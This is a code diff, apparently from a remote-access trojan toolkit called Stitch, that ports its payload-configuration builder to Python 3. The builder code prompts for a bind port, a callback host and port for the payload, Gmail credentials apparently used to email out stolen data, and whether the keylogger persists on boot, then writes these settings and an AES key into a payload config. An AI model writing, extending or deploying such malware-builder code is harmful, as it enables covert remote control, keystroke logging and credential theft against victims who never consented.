@@ -1,4 +1,4 @@
-from stitch_utils import *
+from .stitch_utils import *
 
 class stitch_ini():
     def __init__(self):
@@ -90,9 +90,11 @@ def create_new_config():
         while not check_int(st_bport):
             st_bport = input('\nEnter the port you want the payload to bind itself to?: ').lower()
         BPORT = st_bport
+        BIND = 'True'
     else:
         BHOST = ""
         BPORT = ""
+        BIND = 'False'
 
     st_conn = ''
     while st_conn != "y" and st_conn != "yes" and st_conn != "n" and st_conn != "no":
@@ -112,9 +114,11 @@ def create_new_config():
             st_cport = input(
                 'Enter the port on "{}" that you want the payload to connect to: '.format(st_chost)).lower()
         LPORT = st_cport
+        LISTEN = 'True'
     else:
         LHOST = ""
         LPORT = ""
+        LISTEN = 'False'
 
     st_email = ''
     while st_email != "y" and st_email != "yes" and st_email != "n" and st_email != "no":
@@ -130,17 +134,19 @@ def create_new_config():
             if '@gmail.com' in GMAIL_USER:
                 break
         GMAIL_PWD = base64.b64encode(getpass('Enter your email password for {}: '.format(GMAIL_USER)))
+        EMAIL = 'True'
     else:
         GMAIL_USER = "None"
         GMAIL_PWD = ""
+        EMAIL = 'False'
 
     st_klboot = ''
     while st_klboot != "y" and st_klboot != "yes" and st_klboot != "n" and st_klboot != "no":
         st_klboot = input('\nWould you like the keylogger to start on boot? [Y/N]:  ').lower()
     if st_klboot.startswith('y'):
-        KEYLOGGER_BOOT = True
+        KEYLOGGER_BOOT = 'True'
     elif st_klboot.startswith('n'):
-        KEYLOGGER_BOOT = False
+        KEYLOGGER_BOOT = 'False'
 
     stini = stitch_ini()
     stini.set_value('BIND', BIND)
@@ -162,16 +168,16 @@ def get_conf_dir():
     conf_dir = os.path.join(payloads_path,'config{}'.format(i))
     os.makedirs(conf_dir)
 
-    with open(st_config,'rb') as sc:
+    with open(st_config,'r') as sc:
         content=sc.read()
-        content += "AES Encryption Key: {}".format(aes_encoded)
-        with open(os.path.join(conf_dir,'PAYLOAD_CONFIG.log'),'wb') as pc:
+        content += f"AES Encryption Key: {aes_encoded}"
+        with open(os.path.join(conf_dir,'PAYLOAD_CONFIG.log'),'w') as pc:
             pc.write(content)
 
     return conf_dir
 
 def gen_default_st_config():
-    with open(st_config, 'wb') as sc:
+    with open(st_config, 'w') as sc:
         content = '''
 [Windows]
 BIND = True
